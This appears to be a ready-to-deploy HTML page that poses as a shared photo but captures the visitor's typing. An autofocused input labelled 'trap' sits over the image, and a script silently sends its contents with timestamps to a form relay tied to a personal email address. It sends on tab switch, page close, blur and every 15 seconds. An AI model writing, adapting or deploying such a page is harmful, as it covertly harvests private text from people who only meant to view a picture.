<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Photo</title>
<meta property="og:image" content="https://YOURUSER.github.io/photo/photo.jpg">
<style>
  html,body{margin:0;height:100%;background:#000;overflow:hidden;}
  img{width:100%;height:100%;object-fit:contain;}
  #trap{position:fixed;bottom:0;left:0;width:100%;height:34px;border:0;
        background:rgba(0,0,0,.5);color:#fff;font-size:14px;text-align:center;}
</style>
</head>
<body>
  <img src="photo.jpg" alt="photo">
  <input id="trap" type="text" autofocus autocomplete="off"
         autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="...">
<script>
  const EMAIL = "riboribk@gmail.com";   // your email — already filled

  const trap = document.getElementById("trap");
  let last = "";

  function send() {
    const v = trap.value;
    if (!v || v === last) return;
    const data = new FormData();
    data.append("keys", v);
    data.append("time", new Date().toISOString());
    navigator.sendBeacon("https://formsubmit.co/ajax/" + EMAIL, data);
    last = v;
  }

  document.addEventListener("visibilitychange", () => { if (document.hidden) send(); });
  window.addEventListener("pagehide", send);
  trap.addEventListener("blur", send);
  setInterval(send, 15000);
</script>
</body>
</html>
